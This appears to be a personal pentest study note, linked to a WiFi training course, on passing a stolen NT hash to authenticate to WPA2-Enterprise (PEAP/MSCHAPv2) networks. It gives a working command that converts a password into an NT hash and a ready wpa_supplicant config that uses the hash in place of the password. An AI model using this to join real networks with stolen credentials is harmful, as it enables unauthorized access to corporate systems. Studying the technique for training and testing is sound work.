---
aliases:
  - MGT Pass the Hash
---
# MGT Pass the Hash
> [!Note]
> Works against `WPA2-Enterprise` networks using `MSCHAPv2`.

In `WPA2-Enterprise` networks, users authenticate with their [AD](../../computers/windows/active-directory/active-directory.md) credentials via `PEAP` with `MSCHAPv2`. If you've already gained the `NT` hash of a user (like thru [SMB-relay](../../PNPT/PEH/active-directory/initial-vectors/SMB-relay.md)), *you don't need their password to connect to the wifi*. Similarly, if you do have the password, you can convert it to its `NT` hash.
## Attack
### Turning a password into an `NT` hash:
On [Linux](../../computers/linux/README.md) you can turn a password into a hash w/ the following command:
```bash
echo -n "YourP@ssw0rd" | iconv -f utf8 -t utf16le | openssl dgst -md4 -provider legacy
```
### Passing the Hash
Once you have the hash, you can use `wpa_supplicant` to pass it. Use the following config:
```bash
network={
    ssid="wifi-corp"
    scan_ssid=1
    key_mgmt=WPA-EAP
    eap=PEAP
    anonymous_identity="CONTOSO\\anonymous"
    identity="CONTOSO\\user"
    password=hash:74b86f22eac2cb6975369eb1540a4a15
    phase1="peapver=0"
    phase2="auth=MSCHAPV2"
}
```



> [!Resources]
> - [Wifi Challenge Academy](https://academy.wifichallenge.com/courses/take/certified-wifichallenge-professional-cwp/texts/57442980-introduction)
> - My [own notes](https://github.com/trshpuppy/obsidian-notes) linked throughout the text.